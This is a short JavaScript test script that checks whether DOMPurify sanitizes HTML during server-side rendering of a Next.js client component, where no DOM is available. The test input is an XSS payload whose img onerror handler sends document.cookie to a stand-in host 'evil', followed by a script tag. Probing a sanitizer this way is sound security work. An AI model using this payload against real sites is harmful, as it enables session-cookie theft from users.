// Prove dompurify behaviour with no DOM (i.e. during Next.js SSR of a client component)
const mod = await import('/home/user/lastdonor/node_modules/dompurify/dist/purify.cjs.js');
const DOMPurify = mod.default ?? mod;
console.log('typeof window      :', typeof window);
console.log('isSupported        :', DOMPurify.isSupported);
const payload = '<img src=x onerror="fetch(`https://evil/?c=${document.cookie}`)"><script>alert(1)<\/script>';
const out = DOMPurify.sanitize(payload);
console.log('input              :', payload);
console.log('output             :', out);
console.log('UNCHANGED (vuln)   :', out === payload);
